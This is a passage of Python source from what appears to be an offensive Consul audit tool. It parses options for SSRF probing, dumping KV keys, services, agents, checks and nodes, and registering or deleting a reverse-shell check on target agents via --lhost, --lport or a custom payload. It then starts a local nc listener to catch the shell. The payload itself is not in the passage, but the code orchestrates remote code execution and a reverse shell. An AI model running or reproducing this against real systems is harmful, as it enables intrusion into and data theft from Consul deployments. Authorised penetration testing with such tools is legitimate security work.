    if revshell_listen and delete_revshell:
        console.error("--listen cannot be used with --delete")
        return 2
    if revshell_listen and revshell_port is None:
        console.error("--listen requires --lport")
        return 2
    if revshell_enabled and not delete_revshell:
        if revshell_payload:
            ignored_payload_flags: list[str] = []
            if revshell_host:
                ignored_payload_flags.append("--lhost")
            if revshell_port is not None and not revshell_listen:
                ignored_payload_flags.append("--lport")
            if ignored_payload_flags:
                console.warn(f"{'/'.join(ignored_payload_flags)} ignored when --payload is set")
        else:
            if not revshell_host:
                console.error("--lhost is required when --revshell is set (unless --payload is provided)")
                return 2
            if revshell_port is None:
                console.error("--lport is required when --revshell is set (unless --payload is provided)")
                return 2
            if not re.fullmatch(r"[A-Za-z0-9._-]+", revshell_host):
                console.error("--lhost must be a plain IPv4/DNS hostname (letters, digits, dot, dash, underscore)")
                return 2
    elif revshell_enabled and delete_revshell:
        if revshell_host or revshell_port is not None:
            console.warn("--lhost/--lport ignored with --revshell --delete")
        if revshell_payload:
            console.warn("--payload ignored with --revshell --delete")
    elif delete_by_id_without_revshell:
        if revshell_host or revshell_port is not None:
            console.warn("--lhost/--lport ignored with --delete --check-id")
        if revshell_payload:
            console.warn("--payload ignored with --delete --check-id")
    elif (
        revshell_host
        or revshell_port is not None
        or revshell_payload
        or revshell_listen
        or (revshell_check_id and not check_id_used_for_dump)
    ):
        ignored_flags: list[str] = []
        if revshell_host:
            ignored_flags.append("--lhost")
        if revshell_port is not None:
            ignored_flags.append("--lport")
        if revshell_payload:
            ignored_flags.append("--payload")
        if revshell_listen:
            ignored_flags.append("--listen")
        if revshell_check_id and not check_id_used_for_dump:
            ignored_flags.append("--check-id")
        console.warn(f"{'/'.join(ignored_flags)} ignored without --revshell")

    check_dump_id = revshell_check_id if dump_requested else None

    # Singular selectors imply the corresponding collection output when dumping.
    if dump_requested and agent_dump_name:
        show_agents = True
    if dump_requested and node_dump_name:
        show_nodes = True
    if dump_requested and check_dump_id:
        show_checks = True
    if dump_requested and service_dump_name:
        show_services = True

    dump_scope_selected = any(
        (
            show_keys,
            bool(kv_key),
            show_services,
            bool(service_dump_name),
            show_agents,
            show_checks,
            bool(agent_dump_name),
            show_nodes,
            bool(node_dump_name),
        )
    )
    dump_all_requested = bool(dump_requested and not dump_scope_selected)
    if dump_all_requested:
        # Dump all categories by default. KV dump has a dedicated section and does not need --keys.
        show_services = True
        show_agents = True
        show_checks = True
        show_nodes = True

    stream_to_stdout = not bool(args.output)

    def emit_line(line: str) -> None:
        if args.output_format != "txt":
            print(line, flush=True)
            return
        if line.startswith(_CONSUL_TAG) and all(t not in line for t in (" [*] ", " [+] ", " [-] ", " [!] ")):
            if console.render_tagged_payload_line(line, _CONSUL_TAG, payload_color="orange"):
                return
            console.plain(line, color="white")
            return
        if _render_colored_consul_line(console, line):
            return
        if args.debug:
            console.plain(line)

    if args.debug and args.output_format == "txt":
        auth_label = "token" if token else ("basic" if (username is not None or password is not None) else "none")
        console.info(
            f"consul audit started: hosts={len(hosts)} ports={len(ports)} timeout={args.timeout}s "
            f"workers={args.workers} retries={args.retries} auth={auth_label} ssrf={do_ssrf} "
            f"keys={show_keys} dump={dump_requested} dump_all={dump_all_requested} "
            f"services={show_services} agents={show_agents} checks={show_checks} nodes={show_nodes} "
            f"check_filter={check_dump_id or '-'} service_filter={service_dump_name or '-'} "
            f"agent_filter={agent_dump_name or '-'} node_filter={node_dump_name or '-'} "
            f"format={args.output_format}"
            f" revshell={'delete' if delete_revshell else ('on' if revshell_enabled else 'off')}"
            f" revshell_listen={revshell_listen}"
            f" revshell_payload={'custom' if revshell_payload else 'default'}"
            f" revshell_delete_target={revshell_check_id or 'prefix'}"
            f" revshell_delete_mode={'id' if delete_by_id_without_revshell or (delete_revshell and revshell_check_id) else ('prefix' if delete_revshell else 'n/a')}"
        )

    total = 0
    detected = 0
    failed = 0
    revshell_registered_any = False
    try:
        for idx, port in enumerate(ports):
            part_total, part_detected, part_failed, part_revshell_registered = audit_consul_targets(
                hosts=hosts,
                port=port,
                timeout=args.timeout,
                retries=args.retries,
                workers=args.workers,
                token=token,
                username=username,
                password=password,
                do_ssrf=do_ssrf,
                ssrf_urls=ssrf_urls,
                show_keys=show_keys,
                kv_key=kv_key,
                dump_requested=dump_requested,
                dump_all_requested=dump_all_requested,
                show_services=show_services,
                show_agents=show_agents,
                show_checks=show_checks,
                check_dump_id=check_dump_id,
                show_nodes=show_nodes,
                service_name=service_name,
                service_dump_name=service_dump_name,
                agent_dump_name=agent_dump_name,
                node_dump_name=node_dump_name,
                delete_service=delete_service,
                service_args=service_args,
                revshell_enabled=revshell_enabled,
                delete_revshell=delete_revshell,
                revshell_listen=revshell_listen,
                revshell_host=revshell_host,
                revshell_port=revshell_port,
                revshell_payload=revshell_payload,
                revshell_check_id=revshell_check_id,
                output_path=args.output,
                output_format=args.output_format,
                emit_line=emit_line,
                logger=logger if args.debug else None,
                append_output=idx > 0,
                suppress_timeout_status_lines=not bool(args.debug),
            )
            total += part_total
            detected += part_detected
            failed += part_failed
            revshell_registered_any = bool(revshell_registered_any or part_revshell_registered)
    except OSError as exc:
        console.error(f"failed to process consul output: {exc}")
        return 2

    if stream_to_stdout and total > 0 and detected == 0 and failed == total and args.output_format == "txt":
        console.warn("all consul targets are unreachable; check host/port and network reachability")

    if args.debug:
        console.info(f"consul audit complete: total={total} detected={detected} fail={failed}")

    if revshell_enabled and not delete_revshell and revshell_listen and revshell_port is not None:
        if len(hosts) * len(ports) > 1:
            console.warn("--listen starts one local listener for all selected targets/ports")
        if not revshell_registered_any:
            console.warn("local listener not started: revshell check was not registered")
        else:
            listen_result = _start_local_nc_listener(int(revshell_port))
            if listen_result.get("started"):
                console.info(f"local listener started: {listen_result.get('cmd')} (pid:{listen_result.get('pid')})")
                maybe_proc = listen_result.get("process")
                if isinstance(maybe_proc, subprocess.Popen):
                    try:
                        maybe_proc.wait()
                    except KeyboardInterrupt:
                        return 130
            else:
                listen_err = str(listen_result.get("error") or "listener start failed").strip()
                console.warn(f"local listener start failed err={_clip(listen_err, 120)}")

    return 0
